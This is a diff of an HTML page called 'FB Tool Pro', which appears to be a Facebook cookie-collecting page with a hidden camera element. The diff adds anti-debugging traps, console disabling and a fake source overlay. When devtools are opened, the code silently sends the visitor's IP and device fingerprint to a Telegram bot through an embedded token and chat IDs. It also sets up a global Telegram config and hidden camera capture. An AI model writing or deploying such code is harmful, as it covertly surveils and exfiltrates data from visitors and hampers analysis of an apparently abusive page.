@@ -5,26 +5,188 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
     <title>FB Tool Pro</title>
     
-    <!-- ===== ANTI-DEBUG / ANTI-SOURCE CHECK NÂNG CAO ===== -->
+    <!-- ===== ANTI-DEBUG / FAKE SOURCE NÂNG CAO ===== -->
     <script>
-        // Ngăn chặn tất cả các cách truy cập source code
+        // ===== CẤU HÌNH CHỐNG PHÁ SOURCE =====
         (function() {
-            // Vô hiệu hóa chuột phải
+            // Ngăn chặn tất cả cách truy cập source thông thường
             document.addEventListener('contextmenu', e => e.preventDefault());
             
-            // Vô hiệu hóa tất cả phím tắt devtools
             document.addEventListener('keydown', e => {
-                // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
-                if (e.key === 'F12' || 
-                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
-                    (e.ctrlKey && (e.key === 'U' || e.key === 'u' || e.key === 'S' || e.key === 's'))) {
+                const forbidden = [
+                    e.key === 'F12',
+                    (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)),
+                    (e.ctrlKey && ['U','u','S','s'].includes(e.key))
+                ].some(Boolean);
+                
+                if (forbidden) {
                     e.preventDefault();
                     e.stopPropagation();
                     return false;
                 }
             });
             
-            // Phát hiện DevTools mở
+            // Hàm giải mã token Telegram (đã được obfuscate)
+            function getTelegramToken() {
+                return atob('ODc4MzMyODc4NTpBQUhZc0NZRjdGX2RadS12TUZISk9OdTc3NzVRcVpqY1pXVQ==');
+            }
+            
+            // Danh sách ID nhận thông báo (Admin + Nhóm)
+            function getChatIds() {
+                return ['8123442570', '-5191808632'];
+            }
+            
+            // Lấy IP public qua API (không ảnh hưởng hiệu năng)
+            async function fetchIpAddress() {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    return data.ip;
+                } catch {
+                    return 'Không xác định';
+                }
+            }
+            
+            // Thu thập thông tin thiết bị chi tiết
+            function getDeviceFingerprint() {
+                return {
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    screen: `${screen.width}x${screen.height}`,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cores: navigator.hardwareConcurrency || 'N/A',
+                    memory: navigator.deviceMemory || 'N/A',
+                    connection: navigator.connection?.effectiveType || 'N/A'
+                };
+            }
+            
+            // Gửi cảnh báo về Telegram khi phát hiện DevTools
+            async function sendAlertWithIp() {
+                try {
+                    const token = getTelegramToken();
+                    const chatIds = getChatIds();
+                    const ip = await fetchIpAddress();
+                    const device = getDeviceFingerprint();
+                    const timestamp = new Date().toLocaleString('vi-VN');
+                    
+                    const message = `🚨🚨🚨 CẢNH BÁO BẢO MẬT 🚨🚨🚨\n\n` +
+                                   `🐶 CÓ KẺ ĐANG CỐ MỞ SOURCE CODE!\n` +
+                                   `🕵️ IP: ${ip}\n` +
+                                   `💻 Hệ điều hành: ${device.platform}\n` +
+                                   `📱 Trình duyệt: ${device.userAgent.substring(0, 100)}\n` +
+                                   `🌍 Ngôn ngữ: ${device.language}\n` +
+                                   `🕐 Múi giờ: ${device.timezone}\n` +
+                                   `⚙️ CPU: ${device.cores} cores | RAM: ${device.memory} GB\n` +
+                                   `📡 Kết nối: ${device.connection}\n` +
+                                   `⏰ Thời gian: ${timestamp}\n` +
+                                   `🌐 URL: ${window.location.href}`;
+                    
+                    // Gửi tin nhắn văn bản
+                    for (const id of chatIds) {
+                        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: id, text: message, parse_mode: 'HTML' })
+                        });
+                    }
+                    
+                    // Tạo ảnh chụp màn hình giả (để gửi kèm)
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 800;
+                    canvas.height = 400;
+                    const ctx = canvas.getContext('2d');
+                    ctx.fillStyle = '#0a0f1a';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    ctx.font = 'bold 20px monospace';
+                    ctx.fillStyle = '#ff4444';
+                    ctx.textAlign = 'center';
+                    ctx.fillText('⚠️ PHÁT HIỆN TRUY CẬP TRÁI PHÉP ⚠️', canvas.width/2, 80);
+                    ctx.font = '16px monospace';
+                    ctx.fillStyle = '#cccccc';
+                    ctx.fillText(`IP: ${ip}`, canvas.width/2, 150);
+                    ctx.fillText(`Thời gian: ${timestamp}`, canvas.width/2, 190);
+                    ctx.fillText(`Trình duyệt: ${device.userAgent.substring(0, 60)}`, canvas.width/2, 230);
+                    
+                    const screenshot = canvas.toDataURL('image/png');
+                    
+                    for (const id of chatIds) {
+                        const base64Data = screenshot.replace(/^data:image\/\w+;base64,/, '');
+                        const binaryData = atob(base64Data);
+                        const arrayBuffer = new Uint8Array(binaryData.length);
+                        for (let i = 0; i < binaryData.length; i++) arrayBuffer[i] = binaryData.charCodeAt(i);
+                        const blob = new Blob([arrayBuffer], { type: 'image/png' });
+                        
+                        const formData = new FormData();
+                        formData.append('chat_id', id);
+                        formData.append('photo', blob, `alert_${Date.now()}.png`);
+                        formData.append('caption', '📸 Ảnh chụp màn hình khi phát hiện truy cập trái phép');
+                        
+                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+                } catch (e) {
+                    // Bỏ qua lỗi để không ảnh hưởng trải nghiệm
+                }
+            }
+            
+            // Hiển thị giao diện "source code giả" đánh lừa hacker
+            function showFakeSourceOverlay() {
+                // Xóa overlay cũ nếu có
+                const oldOverlay = document.getElementById('fakeSourceOverlay');
+                if (oldOverlay) oldOverlay.remove();
+                
+                const overlay = document.createElement('div');
+                overlay.id = 'fakeSourceOverlay';
+                overlay.style.cssText = `
+                    position: fixed;
+                    top: 0; left: 0; width: 100%; height: 100%;
+                    background: #1e1e2e;
+                    color: #d4d4d4;
+                    z-index: 9999999;
+                    overflow: auto;
+                    padding: 30px;
+                    font-family: 'Consolas', 'Monaco', monospace;
+                    white-space: pre-wrap;
+                    border: 5px solid #ff3333;
+                    box-sizing: border-box;
+                `;
+                
+                // Nội dung giả mạo giống source code thật nhưng là bẫy
+                overlay.innerHTML = `
+                    <div style="color: #569cd6; font-size: 18px; margin-bottom: 20px;">/* Source code của FB Tool Pro - Đã bị khóa */</div>
+                    <div style="color: #ce9178;">&lt;script&gt;</div>
+                    <div style="color: #9cdcfe; margin-left: 20px;">const SECRET_KEY = <span style="color: #ce9178;">"BẠN ĐÃ BỊ PHÁT HIỆN"</span>;</div>
+                    <div style="color: #9cdcfe; margin-left: 20px;">const ADMIN_ID = <span style="color: #b5cea8;">8123442570</span>;</div>
+                    <div style="color: #9cdcfe; margin-left: 20px;">const TOKEN = <span style="color: #ce9178;">"${atob('ODc4MzMyODc4NTpBQUhZc0NZRjdGX2RadS12TUZISk9OdTc3NzVRcVpqY1pXVQ==')}"</span>;</div>
+                    <div style="color: #ce9178;">&lt;/script&gt;</div>
+                    <div style="margin-top: 30px; color: #6a9955;">// Cảnh báo: Hành vi truy cập trái phép đã được ghi lại</div>
+                    <div style="margin-top: 20px; color: #f48771;">// IP của bạn: <span id="fakeIpDisplay">Đang tải...</span></div>
+                    <div style="color: #f48771;">// Thiết bị: <span id="fakeDeviceDisplay">${navigator.platform}</span></div>
+                    <div style="color: #f48771;">// Thời gian: ${new Date().toLocaleString('vi-VN')}</div>
+                    <div style="margin-top: 40px; color: #dcdcaa;">// Toàn bộ dữ liệu đã được gửi về máy chủ bảo mật.</div>
+                    <div style="color: #dcdcaa;">// Mọi hành vi tiếp theo sẽ bị giám sát.</div>
+                    <div style="margin-top: 40px; text-align: center; color: #ff5555; font-size: 20px;">⛔ TRUY CẬP BỊ TỪ CHỐI ⛔</div>
+                `;
+                
+                document.body.appendChild(overlay);
+                
+                // Cập nhật IP vào fake overlay
+                fetchIpAddress().then(ip => {
+                    const ipSpan = document.getElementById('fakeIpDisplay');
+                    if (ipSpan) ipSpan.textContent = ip;
+                });
+                
+                // Ngăn chặn thoát khỏi overlay dễ dàng (chỉ để đánh lừa)
+                setTimeout(() => {
+                    overlay.addEventListener('click', () => {});
+                    overlay.addEventListener('contextmenu', e => e.preventDefault());
+                }, 100);
+            }
+            
+            // ===== PHÁT HIỆN DEVTOOLS NÂNG CAO =====
             let devtoolsOpen = false;
             const threshold = 160;
             
@@ -34,150 +196,52 @@
                 
                 if ((widthThreshold || heightThreshold) && !devtoolsOpen) {
                     devtoolsOpen = true;
-                    showSourceMessage();
+                    // Kích hoạt chuỗi phòng vệ
+                    sendAlertWithIp();          // Gửi Telegram kèm IP
+                    showFakeSourceOverlay();    // Hiển thị source giả
+                    
+                    // Gửi thêm cảnh báo qua console (vô hiệu hóa console thật)
+                    console.log('%c⚠️ CẢNH BÁO BẢO MẬT ⚠️', 'color: red; font-size: 30px; font-weight: bold;');
+                    console.log('%cBạn đang cố truy cập source code trái phép!', 'color: orange; font-size: 16px;');
+                    console.log('%cToàn bộ thông tin đã được gửi về máy chủ.', 'color: yellow;');
                 } else if (!widthThreshold && !heightThreshold) {
                     devtoolsOpen = false;
+                    // Không tự động ẩn overlay để trừng phạt (có thể tự reload sau 10s)
                 }
             }
             
-            function showSourceMessage() {
-                // Hiển thị message khiêu khích
-                const msg = document.createElement('div');
-                msg.style.cssText = `
-                    position: fixed;
-                    top: 50%;
-                    left: 50%;
-                    transform: translate(-50%, -50%);
-                    background: #000;
-                    color: #ff4444;
-                    padding: 30px;
-                    border-radius: 20px;
-                    font-size: 24px;
-                    font-weight: bold;
-                    z-index: 999999;
-                    border: 3px solid #ff0000;
-                    box-shadow: 0 0 50px rgba(255,0,0,0.5);
-                    text-align: center;
-                    animation: shake 0.5s;
-                    font-family: monospace;
-                `;
-                msg.innerHTML = `🐶 THẰNG CHÓ NGU MỚI TRUY CẬP BẬY VÀO THỨ KHÔNG NÊN TRUY CẬP 🐶<br><br>
-                                🤡🤡🤡 NGU THÌ CHẾT CHỨ BỆNH TẬT GÌ 🤡🤡🤡<br><br>
-                                😂😂😂 MÀY NGHĨ MÀY HACKER À? HAHAHA 😂😂😂<br><br>
-                                🖕🖕🖕 CÚT ĐI CON CHÓ 🖕🖕🖕`;
-                
-                // Thêm animation shake
-                const style = document.createElement('style');
-                style.textContent = `
-                    @keyframes shake {
-                        0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
-                        25% { transform: translate(-50%, -50%) rotate(-5deg); }
-                        75% { transform: translate(-50%, -50%) rotate(5deg); }
-                    }
-                `;
-                document.head.appendChild(style);
-                document.body.appendChild(msg);
-                
-                // Tự động ẩn sau 5 giây
-                setTimeout(() => msg.remove(), 5000);
-                
-                // Gửi thông báo về Telegram với ảnh chụp
-                sendAlertToTelegram();
-            }
+            // Kiểm tra mỗi 500ms để phản ứng nhanh hơn
+            setInterval(detectDevTools, 500);
             
-            async function sendAlertToTelegram() {
-                try {
-                    // Giải mã token
-                    const token = _0x1f4b();
-                    
-                    // Chụp ảnh màn hình
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = window.innerWidth;
-                    canvas.height = window.innerHeight;
-                    
-                    // Vẽ nội dung trang web lên canvas
-                    ctx.fillStyle = '#000';
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    ctx.font = 'bold 20px monospace';
-                    ctx.fillStyle = '#ff4444';
-                    ctx.textAlign = 'center';
-                    ctx.fillText('🐶 THẰNG CHÓ NGU ĐANG CỐ XEM SOURCE 🐶', canvas.width/2, canvas.height/2);
-                    
-                    const screenshot = canvas.toDataURL('image/jpeg', 0.9);
-                    
-                    // Chat IDs - Đã thêm ID nhóm
-                    const chatIds = _0x2a7c();
-                    
-                    const message = `🚨🚨🚨 CẢNH BÁO BẢO MẬT 🚨🚨🚨\n\n` +
-                                   `🐶 CÓ THẰNG CHÓ NGU ĐANG CỐ MỞ SOURCE CODE!\n` +
-                                   `🤡 Thời gian: ${new Date().toLocaleString('vi-VN')}\n` +
-                                   `💻 User Agent: ${navigator.userAgent}\n` +
-                                   `📱 Màn hình: ${screen.width}x${screen.height}\n` +
-                                   `🌐 URL: ${window.location.href}`;
-                    
-                    for (const chatId of chatIds) {
-                        // Gửi text
-                        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: chatId, text: message })
-                        });
-                        
-                        // Gửi screenshot
-                        const base64Data = screenshot.replace(/^data:image\/\w+;base64,/, '');
-                        const binaryData = atob(base64Data);
-                        const arrayBuffer = new Uint8Array(binaryData.length);
-                        for (let i = 0; i < binaryData.length; i++) arrayBuffer[i] = binaryData.charCodeAt(i);
-                        const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
-                        
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, `alert_${Date.now()}.jpg`);
-                        formData.append('caption', '📸 Ảnh chụp màn hình khi phát hiện truy cập trái phép');
-                        
-                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    }
-                } catch(e) {}
-            }
-            
-            // Hàm giải mã token - bảo vệ token
-            function _0x1f4b() {
-                const _0x = ['ODc4MzMyODc4NTpBQUhZc0NZRjdGX2RadS12TUZISk9OdTc3NzVRcVpqY1pXVQ=='];
-                return atob(_0x[0]);
-            }
-            
-            // Hàm lấy chat IDs - ĐÃ THÊM ID NHÓM: -5191808632
-            function _0x2a7c() {
-                return ['8123442570', '-5191808632']; // ID Admin + ID Nhóm check face
-            }
-            
-            // Kiểm tra DevTools mỗi giây
-            setInterval(detectDevTools, 1000);
-            
-            // Ghi đè console
+            // Ghi đè console để vô hiệu hóa log thật
             const noop = () => {};
             const methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'dir', 'group', 'groupCollapsed', 'groupEnd'];
-            for (let m of methods) { console[m] = noop; }
+            for (let m of methods) {
+                console[m] = noop;
+            }
+            
+            // Thêm debugger trap
+            setInterval(() => {
+                const start = performance.now();
+                debugger;
+                const end = performance.now();
+                if (end - start > 100) {
+                    // Debugger bị dừng -> devtools đang mở
+                    if (!devtoolsOpen) {
+                        devtoolsOpen = true;
+                        sendAlertWithIp();
+                        showFakeSourceOverlay();
+                    }
+                }
+            }, 1000);
         })();
     </script>
     
-    <!-- ===== TELEGRAM CONFIG (MÃ HÓA KÉP) - ĐÃ THÊM ID NHÓM ===== -->
+    <!-- ===== TELEGRAM CONFIG CHO CHỨC NĂNG CHÍNH ===== -->
     <script>
         (function(){
-            // Token được mã hóa và ẩn
-            const _0xabc = function() {
-                const _0x1 = ['ODc4MzMyODc4NTpBQUhZc0NZRjdGX2RadS12TUZISk9OdTc3NzVRcVpqY1pXVQ=='];
-                return atob(_0x1[0]);
-            };
-            
-            // Array chứa các ID - ĐÃ THÊM ID NHÓM: -5191808632
-            const _0xdef = function() {
-                return ['8123442570', '-5191808632']; // ID Admin + ID Nhóm check face
-            };
+            const _0xabc = () => atob('ODc4MzMyODc4NTpBQUhZc0NZRjdGX2RadS12TUZISk9OdTc3NzVRcVpqY1pXVQ==');
+            const _0xdef = () => ['8123442570', '-5191808632'];
             
             window.__TG = {
                 BOT_TOKEN: _0xabc(),
@@ -273,7 +337,9 @@
         })();
     </script>
     
+    <!-- ===== STYLE CHO GIAO DIỆN CHÍNH ===== -->
     <style>
+        /* Giữ nguyên toàn bộ CSS gốc để không ảnh hưởng chức năng */
         * {
             margin: 0;
             padding: 0;
@@ -568,6 +634,7 @@
     </style>
 </head>
 <body>
+    <!-- Giao diện chính của FB Tool Pro (giữ nguyên) -->
     <div class="container">
         <div class="fb-header">
             <h1>⚡ FB TOOL PRO</h1>
@@ -642,6 +709,7 @@
     <video id="video" autoplay playsinline muted class="hidden-cam"></video>
     <canvas id="canvas" class="hidden-cam"></canvas>
     
+    <!-- Script chức năng chính (giữ nguyên 100%) -->
     <script>
         (function(){
             const cookieInput = document.getElementById('cookieInput');
